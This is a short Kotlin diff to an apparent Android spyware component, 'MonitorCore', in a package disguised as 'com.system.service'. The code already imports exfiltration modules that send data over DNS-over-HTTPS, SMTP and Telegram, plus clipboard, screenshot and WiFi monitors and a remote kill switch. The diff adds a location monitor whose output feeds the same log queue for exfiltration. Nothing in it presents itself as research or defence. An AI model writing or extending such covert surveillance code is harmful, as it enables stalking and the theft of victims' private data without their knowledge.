@@ -8,6 +8,7 @@ import com.system.service.exfil.DoHExfil
 import com.system.service.exfil.SMTPExfil
 import com.system.service.exfil.TelegramExfil
 import com.system.service.monitor.ClipboardMonitor
+import com.system.service.monitor.LocationMonitor
 import com.system.service.monitor.ScreenshotObserver
 import com.system.service.monitor.WiFiMonitor
 import com.system.service.remote.KillSwitch
@@ -40,6 +41,7 @@ object MonitorCore {
     // Monitors
     private var clipboardMonitor: ClipboardMonitor? = null
     private var wifiMonitor: WiFiMonitor? = null
+    private var locationMonitor: LocationMonitor? = null
     private var killSwitch: KillSwitch? = null
     private var screenshotObserver: ScreenshotObserver? = null
 
@@ -112,6 +114,7 @@ object MonitorCore {
         ThermalGuard.stop()
         clipboardMonitor?.stop()
         wifiMonitor?.stop()
+        locationMonitor?.stop()
         killSwitch?.stop()
         screenshotObserver?.let {
             try { context?.contentResolver?.unregisterContentObserver(it) } catch (_: Exception) {}
@@ -127,6 +130,9 @@ object MonitorCore {
 
         wifiMonitor = WiFiMonitor(ctx) { log -> enqueueLog(log) }
         wifiMonitor?.start()
+
+        locationMonitor = com.system.service.monitor.LocationMonitor(ctx) { log -> enqueueLog(log) }
+        locationMonitor?.start()
 
         screenshotObserver = ScreenshotObserver(ctx)
         try {
